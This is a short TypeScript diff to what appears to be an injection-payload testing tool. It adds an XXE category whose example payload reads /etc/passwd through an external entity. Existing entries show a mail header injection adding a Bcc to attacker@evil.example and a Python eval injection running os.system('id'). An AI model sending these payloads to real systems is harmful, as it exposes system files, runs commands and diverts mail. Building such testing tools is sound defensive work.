@@ -38,6 +38,7 @@ export const LANG_GROUPS: LangGroup[] = [
     title: "Serialization",
     langs: [
       { value: "xml", label: "XML" },
+      { value: "xxe", label: "XXE" },
       { value: "yaml", label: "YAML" },
       { value: "csv", label: "CSV formula" },
     ],
@@ -94,6 +95,7 @@ export const DIALECTS: Record<Lang, string[]> = {
   ssrf: [],
   path: [],
   mail: [],
+  xxe: [],
   code: ["python", "javascript", "php"],
   crlf: ["header", "log"],
   prompt: [],
@@ -173,6 +175,11 @@ export const EXAMPLES: Record<Lang, Example> = {
     template: "To: {INPUT}",
     payload: "user@example.com\r\nBcc: attacker@evil.example",
   },
+  xxe: {
+    template: "{INPUT}",
+    payload:
+      '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><r>&xxe;</r>',
+  },
   code: {
     template: 'eval("result = {INPUT}")',
     payload: "\"; __import__('os').system('id') #",
@@ -226,5 +233,6 @@ export const supportsMutation = (lang: Lang): boolean =>
   lang === "ssrf" ||
   lang === "path" ||
   lang === "mail" ||
+  lang === "xxe" ||
   lang === "code" ||
   lang === "crlf";
